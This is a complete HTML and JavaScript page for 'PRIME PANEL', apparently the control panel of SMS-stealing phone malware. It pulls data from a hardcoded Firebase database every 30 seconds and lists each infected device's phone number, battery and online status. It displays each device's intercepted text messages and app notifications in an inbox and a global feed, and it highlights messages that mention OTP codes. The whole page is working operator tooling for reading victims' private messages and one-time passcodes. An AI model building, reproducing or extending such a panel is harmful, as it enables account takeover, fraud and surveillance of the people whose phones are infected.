<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PRIME PANEL - SMS Monitor</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: #0a0e17;
            color: #e0e0e0;
            min-height: 100vh;
            padding: 16px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 16px 24px;
            background: rgba(20, 30, 50, 0.8);
            border-radius: 12px;
            border: 1px solid rgba(100, 150, 255, 0.08);
            margin-bottom: 20px;
            flex-wrap: wrap;
            gap: 12px;
        }

        .header-left h1 {
            font-size: 20px;
            color: #4fc3f7;
            font-weight: 700;
        }

        .header-left .subtitle {
            font-size: 11px;
            color: #8899aa;
            letter-spacing: 1px;
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .header-right .stats {
            display: flex;
            gap: 16px;
        }

        .header-right .stat-item {
            text-align: center;
        }

        .header-right .stat-item .number {
            font-size: 24px;
            font-weight: bold;
            color: #4fc3f7;
        }

        .header-right .stat-item .number.online {
            color: #4caf50;
        }

        .header-right .stat-item .label {
            font-size: 10px;
            color: #8899aa;
            letter-spacing: 0.5px;
        }

        .refresh-btn {
            background: rgba(79, 195, 247, 0.15);
            color: #4fc3f7;
            border: 1px solid rgba(79, 195, 247, 0.3);
            padding: 6px 16px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .refresh-btn:hover {
            background: rgba(79, 195, 247, 0.25);
        }

        .refresh-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* SIM Slots */
        .sim-slots {
            display: flex;
            gap: 6px;
            margin-bottom: 16px;
            flex-wrap: wrap;
        }

        .sim-slot {
            background: rgba(20, 30, 50, 0.6);
            border: 1px solid rgba(100, 150, 255, 0.08);
            border-radius: 8px;
            padding: 8px 16px;
            min-width: 50px;
            text-align: center;
            font-size: 12px;
            font-weight: 600;
            color: #8899aa;
            cursor: pointer;
            transition: all 0.3s;
        }

        .sim-slot:hover {
            border-color: rgba(79, 195, 247, 0.3);
            background: rgba(79, 195, 247, 0.05);
        }

        .sim-slot.active {
            border-color: #4fc3f7;
            color: #4fc3f7;
            background: rgba(79, 195, 247, 0.1);
            box-shadow: 0 0 20px rgba(79, 195, 247, 0.05);
        }

        .sim-slot .slot-number {
            font-size: 10px;
            color: #667;
        }

        /* Main Layout */
        .main-layout {
            display: grid;
            grid-template-columns: 1fr 340px;
            gap: 16px;
        }

        @media (max-width: 1024px) {
            .main-layout {
                grid-template-columns: 1fr;
            }
        }

        /* Left Panel - Device Grid */
        .devices-panel {
            background: rgba(20, 30, 50, 0.6);
            border-radius: 12px;
            border: 1px solid rgba(100, 150, 255, 0.08);
            padding: 16px;
        }

        .panel-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            flex-wrap: wrap;
            gap: 8px;
        }

        .panel-header h2 {
            font-size: 16px;
            color: #c8d0d8;
            font-weight: 500;
        }

        .panel-header .badge {
            font-size: 11px;
            color: #8899aa;
            background: rgba(255, 255, 255, 0.05);
            padding: 2px 10px;
            border-radius: 12px;
        }

        .search-box {
            display: flex;
            gap: 8px;
            margin-bottom: 12px;
        }

        .search-box input {
            flex: 1;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(100, 150, 255, 0.08);
            border-radius: 8px;
            padding: 8px 14px;
            color: #c8d0d8;
            font-size: 13px;
            outline: none;
            transition: all 0.3s;
        }

        .search-box input::placeholder {
            color: #556;
        }

        .search-box input:focus {
            border-color: rgba(79, 195, 247, 0.3);
        }

        .toggle-group {
            display: flex;
            gap: 4px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 8px;
            padding: 3px;
        }

        .toggle-group button {
            background: transparent;
            border: none;
            color: #8899aa;
            padding: 4px 12px;
            border-radius: 6px;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .toggle-group button.active {
            background: rgba(79, 195, 247, 0.15);
            color: #4fc3f7;
        }

        .toggle-group button:hover:not(.active) {
            color: #c8d0d8;
        }

        .devices-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 8px;
            max-height: 600px;
            overflow-y: auto;
            padding-right: 4px;
        }

        .devices-grid::-webkit-scrollbar {
            width: 4px;
        }

        .devices-grid::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 2px;
        }

        .devices-grid::-webkit-scrollbar-thumb {
            background: rgba(79, 195, 247, 0.2);
            border-radius: 2px;
        }

        .device-card {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            padding: 12px 16px;
            border: 1px solid rgba(100, 150, 255, 0.06);
            cursor: pointer;
            transition: all 0.3s;
        }

        .device-card:hover {
            border-color: rgba(79, 195, 247, 0.15);
            background: rgba(0, 0, 0, 0.4);
        }

        .device-card.selected {
            border-color: #4fc3f7;
            background: rgba(79, 195, 247, 0.05);
        }

        .device-card.offline {
            opacity: 0.5;
        }

        .device-card .device-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .device-card .device-id {
            font-family: monospace;
            font-size: 12px;
            color: #8899aa;
        }

        .device-card .device-phone {
            font-size: 13px;
            color: #c8d0d8;
            font-weight: 500;
        }

        .device-card .device-phone.copyable {
            cursor: pointer;
            color: #4fc3f7;
        }

        .device-card .device-phone.copyable:hover {
            text-decoration: underline;
        }

        .device-card .device-status {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .device-card .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            display: inline-block;
        }

        .device-card .status-dot.online {
            background: #4caf50;
            box-shadow: 0 0 10px rgba(76, 175, 80, 0.3);
        }

        .device-card .status-dot.offline {
            background: #555;
        }

        .device-card .battery {
            font-size: 12px;
            color: #8899aa;
        }

        .device-card .sms-count {
            font-size: 11px;
            color: #667;
            background: rgba(255, 255, 255, 0.05);
            padding: 2px 10px;
            border-radius: 12px;
        }

        .device-card .device-sms-preview {
            margin-top: 8px;
            padding-top: 8px;
            border-top: 1px solid rgba(255, 255, 255, 0.04);
            font-size: 12px;
            color: #8899aa;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .device-card .device-sms-preview .sender {
            color: #4fc3f7;
        }

        /* Right Panel - SMS Inbox */
        .inbox-panel {
            background: rgba(20, 30, 50, 0.6);
            border-radius: 12px;
            border: 1px solid rgba(100, 150, 255, 0.08);
            padding: 16px;
            display: flex;
            flex-direction: column;
            max-height: 700px;
        }

        .inbox-panel .panel-header {
            flex-shrink: 0;
        }

        .inbox-panel .panel-header h2 {
            font-size: 16px;
            color: #c8d0d8;
            font-weight: 500;
        }

        .inbox-panel .panel-header .device-info {
            font-size: 12px;
            color: #8899aa;
        }

        .inbox-panel .panel-header .device-info strong {
            color: #c8d0d8;
        }

        .inbox-messages {
            flex: 1;
            overflow-y: auto;
            padding-right: 4px;
            margin-top: 8px;
        }

        .inbox-messages::-webkit-scrollbar {
            width: 4px;
        }

        .inbox-messages::-webkit-scrollbar-track {
            background: rgba(255, 255, 255, 0.02);
            border-radius: 2px;
        }

        .inbox-messages::-webkit-scrollbar-thumb {
            background: rgba(79, 195, 247, 0.2);
            border-radius: 2px;
        }

        .inbox-message {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            padding: 10px 14px;
            margin-bottom: 6px;
            border-left: 2px solid rgba(79, 195, 247, 0.2);
        }

        .inbox-message .msg-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 4px;
        }

        .inbox-message .msg-sender {
            font-size: 12px;
            font-weight: 600;
            color: #4fc3f7;
        }

        .inbox-message .msg-time {
            font-size: 10px;
            color: #667;
        }

        .inbox-message .msg-body {
            font-size: 13px;
            color: #c8d0d8;
            word-break: break-word;
            line-height: 1.5;
        }

        .inbox-message .msg-body .highlight {
            color: #ff9800;
        }

        .inbox-placeholder {
            text-align: center;
            color: #8899aa;
            font-size: 13px;
            padding: 40px 0;
        }

        /* Global Feed */
        .feed-section {
            margin-top: 16px;
            background: rgba(20, 30, 50, 0.6);
            border-radius: 12px;
            border: 1px solid rgba(100, 150, 255, 0.08);
            padding: 12px 16px;
        }

        .feed-section .feed-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .feed-section .feed-header h3 {
            font-size: 13px;
            color: #8899aa;
            font-weight: 500;
        }

        .feed-section .feed-header .feed-count {
            font-size: 11px;
            color: #667;
        }

        .feed-messages {
            max-height: 120px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .feed-messages::-webkit-scrollbar {
            width: 3px;
        }

        .feed-messages::-webkit-scrollbar-thumb {
            background: rgba(79, 195, 247, 0.2);
            border-radius: 2px;
        }

        .feed-item {
            font-size: 12px;
            color: #8899aa;
            padding: 4px 8px;
            background: rgba(0, 0, 0, 0.15);
            border-radius: 4px;
            display: flex;
            gap: 8px;
            animation: fadeIn 0.3s ease;
        }

        .feed-item .feed-device {
            color: #4fc3f7;
            font-weight: 500;
            white-space: nowrap;
            font-family: monospace;
            font-size: 11px;
        }

        .feed-item .feed-msg {
            flex: 1;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        .feed-item .feed-time {
            color: #556;
            font-size: 10px;
            white-space: nowrap;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-4px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .loading {
            text-align: center;
            padding: 20px;
            color: #8899aa;
        }

        .spinner {
            border: 2px solid rgba(79, 195, 247, 0.1);
            border-top: 2px solid #4fc3f7;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .toast {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(20, 30, 50, 0.95);
            padding: 10px 24px;
            border-radius: 8px;
            border: 1px solid rgba(79, 195, 247, 0.2);
            color: #c8d0d8;
            font-size: 13px;
            display: none;
            z-index: 1000;
            animation: fadeIn 0.3s ease;
        }

        .toast.show {
            display: block;
        }

        @media (max-width: 768px) {
            body {
                padding: 10px;
            }

            .header {
                padding: 12px 16px;
                flex-direction: column;
                align-items: stretch;
            }

            .header-right {
                justify-content: space-between;
            }

            .main-layout {
                grid-template-columns: 1fr;
            }

            .inbox-panel {
                max-height: 400px;
            }

            .devices-grid {
                max-height: 400px;
            }

            .sim-slots {
                justify-content: center;
            }
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header -->
    <div class="header">
        <div class="header-left">
            <h1>📱 PRIME PANEL</h1>
            <div class="subtitle">REAL-TIME SMS MONITORING SYSTEM</div>
        </div>
        <div class="header-right">
            <div class="stats">
                <div class="stat-item">
                    <div class="number online" id="onlineCount">0</div>
                    <div class="label">ONLINE</div>
                </div>
                <div class="stat-item">
                    <div class="number" id="smsCount">0</div>
                    <div class="label">NEW SMS</div>
                </div>
            </div>
            <button class="refresh-btn" id="refreshBtn" onclick="fetchAllData()">🔄 Refresh</button>
        </div>
    </div>

    <!-- SIM Slots -->
    <div class="sim-slots" id="simSlots">
        <div class="sim-slot active"><span class="slot-number">📱</span> S1</div>
        <div class="sim-slot">S2</div>
        <div class="sim-slot">S3</div>
        <div class="sim-slot">S4</div>
        <div class="sim-slot">S5</div>
        <div class="sim-slot">S6</div>
        <div class="sim-slot">S7</div>
        <div class="sim-slot">S8</div>
    </div>

    <!-- Main Layout -->
    <div class="main-layout">
        <!-- Left: Devices -->
        <div class="devices-panel">
            <div class="panel-header">
                <h2>📱 All Devices</h2>
                <span class="badge" id="deviceCount">0 devices</span>
            </div>
            <div class="search-box">
                <input type="text" id="searchInput" placeholder="Search by ID or phone..." oninput="filterDevices()">
                <div class="toggle-group">
                    <button class="active" id="allToggle" onclick="setFilter('all')">All</button>
                    <button id="onlineToggle" onclick="setFilter('online')">Online</button>
                </div>
            </div>
            <div id="loadingIndicator" class="loading" style="display:none;">
                <div class="spinner"></div>
                <p>Loading devices...</p>
            </div>
            <div class="devices-grid" id="devicesGrid">
                <div class="loading">No devices loaded</div>
            </div>
        </div>

        <!-- Right: SMS Inbox -->
        <div class="inbox-panel">
            <div class="panel-header">
                <div>
                    <h2>📨 SMS Inbox</h2>
                    <div class="device-info" id="selectedDeviceInfo">Select a device to view messages</div>
                </div>
                <div class="device-info" id="smsTotalCount" style="font-size:12px;color:#667;"></div>
            </div>
            <div class="inbox-messages" id="inboxMessages">
                <div class="inbox-placeholder">👈 Select a device from the left</div>
            </div>
        </div>
    </div>

    <!-- Global Feed -->
    <div class="feed-section">
        <div class="feed-header">
            <h3>🌐 Global Message Feed</h3>
            <span class="feed-count" id="feedCount">0 messages</span>
        </div>
        <div class="feed-messages" id="feedMessages">
            <div style="color:#8899aa;font-size:12px;padding:8px;text-align:center;">Waiting for messages...</div>
        </div>
    </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
    // ===== CONFIGURATION =====
    const API_BASE = 'https://sssssmmmmsw-default-rtdb.asia-southeast1.firebasedatabase.app';
    const USERS_URL = `${API_BASE}/users.json?shallow=true`;

    let allUsers = {};
    let selectedDeviceId = null;
    let currentFilter = 'all';
    let searchQuery = '';
    let refreshInterval = null;

    // ===== TOAST =====
    function showToast(msg) {
        const toast = document.getElementById('toast');
        toast.textContent = msg;
        toast.classList.add('show');
        clearTimeout(toast._timeout);
        toast._timeout = setTimeout(() => toast.classList.remove('show'), 2500);
    }

    // ===== COPY TO CLIPBOARD =====
    function copyToClipboard(text) {
        navigator.clipboard?.writeText(text).then(() => {
            showToast(`📋 Copied: ${text}`);
        }).catch(() => {
            // Fallback
            const input = document.createElement('input');
            input.value = text;
            document.body.appendChild(input);
            input.select();
            document.execCommand('copy');
            document.body.removeChild(input);
            showToast(`📋 Copied: ${text}`);
        });
    }

    // ===== DATA FETCHING =====
    async function fetchUserIds() {
        try {
            const response = await fetch(USERS_URL);
            if (!response.ok) throw new Error(`HTTP ${response.status}`);
            const data = await response.json();
            return Object.keys(data);
        } catch (error) {
            console.error('Fetch user IDs error:', error);
            return [];
        }
    }

    async function fetchUserData(userId) {
        try {
            const url = `${API_BASE}/users/${userId}.json`;
            const response = await fetch(url);
            if (!response.ok) return null;
            return await response.json();
        } catch (error) {
            console.error(`Fetch user ${userId} error:`, error);
            return null;
        }
    }

    function parseTimestamp(ts) {
        if (!ts) return 'N/A';
        if (typeof ts === 'number') return new Date(ts).toLocaleString();
        if (typeof ts === 'string') {
            const d = new Date(ts);
            if (!isNaN(d.getTime())) return d.toLocaleString();
            return ts;
        }
        return String(ts);
    }

    function isOnline(userData) {
        return userData?.status?.isOnline === true;
    }

    function getPhoneNumber(userData) {
        if (userData?.simInfo) {
            for (const key in userData.simInfo) {
                const sim = userData.simInfo[key];
                if (sim.number) return sim.number;
            }
        }
        return null;
    }

    function getBattery(userData) {
        return userData?.status?.battery ?? 'N/A';
    }

    function getSmsCount(userData) {
        return userData?.sms_logs ? Object.keys(userData.sms_logs).length : 0;
    }

    function getLatestSms(userData) {
        if (!userData?.sms_logs) return null;
        const entries = Object.entries(userData.sms_logs);
        if (entries.length === 0) return null;
        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
        return entries[0][1];
    }

    function getAllSms(userData) {
        if (!userData?.sms_logs) return [];
        const entries = Object.entries(userData.sms_logs);
        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
        return entries.map(e => ({ id: e[0], ...e[1] }));
    }

    function getNotifications(userData) {
        if (!userData?.notifications) return [];
        const entries = Object.entries(userData.notifications);
        entries.sort((a, b) => (b[1].timestamp || 0) - (a[1].timestamp || 0));
        return entries.map(e => ({ id: e[0], ...e[1] }));
    }

    // ===== RENDER =====
    function renderDevices() {
        const grid = document.getElementById('devicesGrid');
        const loading = document.getElementById('loadingIndicator');
        loading.style.display = 'none';
        grid.innerHTML = '';

        let userIds = Object.keys(allUsers);

        // Filter
        if (currentFilter === 'online') {
            userIds = userIds.filter(id => isOnline(allUsers[id]));
        }

        // Search
        if (searchQuery.trim()) {
            const query = searchQuery.trim().toLowerCase();
            userIds = userIds.filter(id => {
                const user = allUsers[id];
                const phone = getPhoneNumber(user) || '';
                return id.toLowerCase().includes(query) || phone.includes(query);
            });
        }

        if (userIds.length === 0) {
            grid.innerHTML = `<div class="loading">${currentFilter === 'online' ? 'No online devices' : 'No devices found'}</div>`;
            document.getElementById('deviceCount').textContent = '0 devices';
            return;
        }

        document.getElementById('deviceCount').textContent = `${userIds.length} devices`;

        userIds.forEach(id => {
            const user = allUsers[id];
            const online = isOnline(user);
            const phone = getPhoneNumber(user);
            const battery = getBattery(user);
            const smsCount = getSmsCount(user);
            const latest = getLatestSms(user);
            const isSelected = id === selectedDeviceId;

            const card = document.createElement('div');
            card.className = `device-card ${!online ? 'offline' : ''} ${isSelected ? 'selected' : ''}`;
            card.onclick = () => selectDevice(id);

            const displayPhone = phone || 'No number';
            const isCopyable = phone && phone.length > 0;

            let previewHtml = '';
            if (latest && latest.message) {
                const sender = latest.sender || 'Unknown';
                const msg = latest.message.length > 60 ? latest.message.substring(0, 60) + '...' : latest.message;
                previewHtml = `
                    <div class="device-sms-preview">
                        <span class="sender">${escapeHtml(sender)}</span>: ${escapeHtml(msg)}
                    </div>
                `;
            }

            card.innerHTML = `
                <div class="device-row">
                    <div>
                        <div class="device-id">${escapeHtml(id.substring(0, 16))}...</div>
                        <div class="device-phone ${isCopyable ? 'copyable' : ''}" 
                             onclick="${isCopyable ? `event.stopPropagation(); copyToClipboard('${phone}')` : ''}">
                            ${isCopyable ? '📞 ' : ''}${escapeHtml(displayPhone)}
                        </div>
                    </div>
                    <div class="device-status">
                        <span class="status-dot ${online ? 'online' : 'offline'}"></span>
                        <span class="battery">🔋 ${battery}%</span>
                        <span class="sms-count">${smsCount} SMS</span>
                    </div>
                </div>
                ${previewHtml}
            `;

            grid.appendChild(card);
        });

        // Auto-select first if none selected
        if (!selectedDeviceId && userIds.length > 0) {
            selectDevice(userIds[0]);
        }
    }

    function selectDevice(deviceId) {
        selectedDeviceId = deviceId;
        renderDevices();
        renderInbox();
    }

    function renderInbox() {
        const container = document.getElementById('inboxMessages');
        const info = document.getElementById('selectedDeviceInfo');
        const totalCount = document.getElementById('smsTotalCount');

        if (!selectedDeviceId || !allUsers[selectedDeviceId]) {
            container.innerHTML = '<div class="inbox-placeholder">👈 Select a device from the left</div>';
            info.textContent = 'Select a device to view messages';
            totalCount.textContent = '';
            return;
        }

        const user = allUsers[selectedDeviceId];
        const phone = getPhoneNumber(user) || 'No number';
        const battery = getBattery(user);
        const smsList = getAllSms(user);
        const notifList = getNotifications(user);

        info.innerHTML = `<strong>${escapeHtml(selectedDeviceId.substring(0, 12))}...</strong> · 📞 ${escapeHtml(phone)} · 🔋 ${battery}%`;
        totalCount.textContent = `${smsList.length} messages`;

        if (smsList.length === 0 && notifList.length === 0) {
            container.innerHTML = '<div class="inbox-placeholder">📭 No messages for this device</div>';
            return;
        }

        container.innerHTML = '';

        // Show notifications first (they're like messages too)
        notifList.forEach(notif => {
            const div = document.createElement('div');
            div.className = 'inbox-message';
            div.innerHTML = `
                <div class="msg-header">
                    <span class="msg-sender">🔔 ${escapeHtml(notif.app || 'Notification')}</span>
                    <span class="msg-time">${parseTimestamp(notif.timestamp)}</span>
                </div>
                <div class="msg-body"><strong>${escapeHtml(notif.title || '')}</strong><br>${escapeHtml(notif.message || '')}</div>
            `;
            container.appendChild(div);
        });

        // Then SMS
        smsList.forEach(sms => {
            const div = document.createElement('div');
            div.className = 'inbox-message';
            const sender = sms.sender || 'Unknown';
            const isOTP = /otp/i.test(sms.message);
            div.innerHTML = `
                <div class="msg-header">
                    <span class="msg-sender">📨 ${escapeHtml(sender)}</span>
                    <span class="msg-time">${parseTimestamp(sms.timestamp)}</span>
                </div>
                <div class="msg-body ${isOTP ? 'highlight' : ''}">${escapeHtml(sms.message || '')}</div>
            `;
            container.appendChild(div);
        });
    }

    function renderFeed() {
        const container = document.getElementById('feedMessages');
        const countEl = document.getElementById('feedCount');

        const allMsgs = [];
        for (const id in allUsers) {
            const smsList = getAllSms(allUsers[id]);
            smsList.forEach(sms => {
                if (sms.message) {
                    allMsgs.push({
                        deviceId: id,
                        message: sms.message,
                        timestamp: sms.timestamp || Date.now(),
                        sender: sms.sender || 'Unknown'
                    });
                }
            });
        }

        allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
        const recent = allMsgs.slice(0, 30);

        countEl.textContent = `${allMsgs.length} messages`;

        if (recent.length === 0) {
            container.innerHTML = '<div style="color:#8899aa;font-size:12px;padding:8px;text-align:center;">Waiting for messages...</div>';
            return;
        }

        container.innerHTML = recent.map(msg => `
            <div class="feed-item">
                <span class="feed-device">${escapeHtml(msg.deviceId.substring(0, 8))}...</span>
                <span class="feed-msg">${escapeHtml(msg.message.substring(0, 80))}${msg.message.length > 80 ? '...' : ''}</span>
                <span class="feed-time">${parseTimestamp(msg.timestamp)}</span>
            </div>
        `).join('');
    }

    function updateStats() {
        const ids = Object.keys(allUsers);
        let online = 0;
        let totalSms = 0;

        ids.forEach(id => {
            if (isOnline(allUsers[id])) online++;
            totalSms += getSmsCount(allUsers[id]);
        });

        document.getElementById('onlineCount').textContent = online;
        document.getElementById('smsCount').textContent = totalSms;
    }

    function escapeHtml(text) {
        if (!text) return '';
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    // ===== FILTERS =====
    function setFilter(filter) {
        currentFilter = filter;
        document.querySelectorAll('.toggle-group button').forEach(b => b.classList.remove('active'));
        if (filter === 'all') document.getElementById('allToggle').classList.add('active');
        else document.getElementById('onlineToggle').classList.add('active');
        renderDevices();
    }

    function filterDevices() {
        searchQuery = document.getElementById('searchInput').value;
        renderDevices();
    }

    // ===== MAIN FETCH =====
    async function fetchAllData() {
        const btn = document.getElementById('refreshBtn');
        const loading = document.getElementById('loadingIndicator');
        btn.disabled = true;
        loading.style.display = 'block';

        try {
            const userIds = await fetchUserIds();
            if (userIds.length === 0) {
                loading.style.display = 'none';
                document.getElementById('devicesGrid').innerHTML = '<div class="loading">No devices found</div>';
                btn.disabled = false;
                return;
            }

            const promises = userIds.map(id => fetchUserData(id));
            const results = await Promise.all(promises);

            const newUsers = {};
            userIds.forEach((id, i) => {
                if (results[i]) newUsers[id] = results[i];
            });

            allUsers = newUsers;

            // Preserve selected if still exists
            if (selectedDeviceId && !allUsers[selectedDeviceId]) {
                selectedDeviceId = Object.keys(allUsers)[0] || null;
            }

            renderDevices();
            renderInbox();
            renderFeed();
            updateStats();

        } catch (error) {
            console.error('Fetch error:', error);
            document.getElementById('devicesGrid').innerHTML = `
                <div class="loading">❌ Error: ${escapeHtml(error.message)}<br>
                <button onclick="fetchAllData()" style="margin-top:8px;background:rgba(79,195,247,0.15);color:#4fc3f7;border:1px solid rgba(79,195,247,0.3);padding:6px 16px;border-radius:6px;cursor:pointer;">Retry</button></div>
            `;
        } finally {
            btn.disabled = false;
            loading.style.display = 'none';
        }
    }

    // ===== AUTO REFRESH =====
    function startAutoRefresh() {
        if (refreshInterval) clearInterval(refreshInterval);
        refreshInterval = setInterval(fetchAllData, 30000);
    }

    // ===== INIT =====
    document.addEventListener('DOMContentLoaded', () => {
        fetchAllData();
        startAutoRefresh();

        window.addEventListener('beforeunload', () => {
            if (refreshInterval) clearInterval(refreshInterval);
        });
    });

    // Global functions for onclick
    window.fetchAllData = fetchAllData;
    window.setFilter = setFilter;
    window.filterDevices = filterDevices;
    window.selectDevice = selectDevice;
    window.copyToClipboard = copyToClipboard;
    window.showToast = showToast;
</script>
</body>
</html>
